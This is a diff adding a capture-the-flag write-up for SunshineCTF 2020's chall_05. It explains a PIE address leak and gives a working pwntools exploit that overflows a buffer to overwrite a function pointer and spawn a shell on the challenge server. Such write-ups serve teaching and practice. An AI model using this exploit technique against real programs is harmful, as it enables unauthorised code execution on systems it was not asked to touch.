@@ -408,3 +408,104 @@ Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb7\x05@\x0
 $ cat flag.txt
 sun{critical-acclaim-96cfde3d068e77bf}
 ```
+
+## chall_05
+---
+```c
+void vuln(void)
+
+{
+  char local_48 [56];
+  code *local_10;
+  
+  printf("Yes I\'m going to win: %p\n",main);
+  fgets(local_48,100,stdin);
+  (*local_10)();
+  return;
+}
+
+void win(void)
+
+{
+  system("/bin/sh");
+  return;
+}
+```
+
+As far as the code goes, this challenge is almost the same as the previous one. This binary was compiled differently, however:
+```sh
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ checksec chall_05
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_05'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+PIE (Position Independent Executable) is a security feature where the binary gets loaded into a random memory location every time. This means we can't just hardcode the address of the `win` function like last time.
+
+The `printf` statement prints out the address of the `main` function. Even if the program gets loaded into different locations every time, the functions will be at the same offset from each other. We can store the address of `main` and calculate the address of `win`.
+
+Location of main locally:
+```assembly
+(gdb)
+Starting program: /mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_05 
+Race, life's greatest.
+c
+Yes I'm going to win: 0x55555555476d
+```
+
+Location of win locally:
+```assembly
+(gdb) x/i win
+   0x55555555475a <win>:        push   %rbp
+```
+
+The offset difference is `0x55555555475a - 0x55555555476d = -0x13`
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import re
+
+context.binary = ELF('./chall_05')
+
+if args.REMOTE:
+    io = remote('chal.2020.sunshinectf.org', 30005)
+else:
+    io = process(context.binary.path)    
+
+print(io.recvline())
+buffer = 'A' * 56
+
+io.sendline('throwaway')
+response = str(io.recvline()) # 'b"Yes I\'m going to win: 0x000xyz\\n"'
+
+main_address = re.search("0x[0-9a-f]+", response).group()
+offset = 0x13
+win_address = int(main_address, 16) - offset
+payload = p64(win_address)
+exploit = flat(buffer, payload)
+
+print("Sending: ", exploit)
+io.sendline(exploit)
+io.interactive()
+```
+
+```
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_05.py REMOTE
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_05'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
+b"Race, life's greatest.\n"
+Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ\xf7R\xbaeU\x00\x00'
+[*] Switching to interactive mode
+$ cat flag.txt
+sun{chapter-four-9ca97769b74345b1}
+```
